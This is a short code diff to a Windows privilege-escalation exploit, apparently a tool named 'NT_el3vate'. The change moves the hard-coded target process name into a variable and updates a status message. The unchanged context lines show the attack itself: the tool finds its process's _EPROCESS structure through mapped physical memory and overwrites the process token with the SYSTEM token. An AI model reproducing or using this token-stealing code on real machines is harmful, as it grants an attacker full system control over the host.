@@ -16,6 +16,8 @@ unsigned __int64 _EPROCESS_ImageFileName_offset = 0;
 unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0;
 unsigned __int64 _EPROCESS_Token_offset = 0;
 
+const char* targetProcess = "NT_el3vate.exe";
+
 
 void printBytes(void* ptr, int size)
 {
@@ -108,7 +110,7 @@ int main(int argc, char** argv)
 
 	std::vector <unsigned __int64> EPROCESS_cmd;
 
-	if (GetEPROCESSPhysicalBase("NT_el3vate.exe", GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd) == -1)
+	if (GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
@@ -134,7 +136,7 @@ int main(int argc, char** argv)
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
 		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
 		*(unsigned __int64*)castedBuf = systemToken; // this should do it
-		printf("[+] Replaced cmd Token with System Token\n");
+		printf("[+] Replaced %s Token with System Token\n", targetProcess);
 
 		if (UnmapPhysicalMemory(buf) == FALSE) {
 			printf("UnmapPhysicalMemory failed\n");
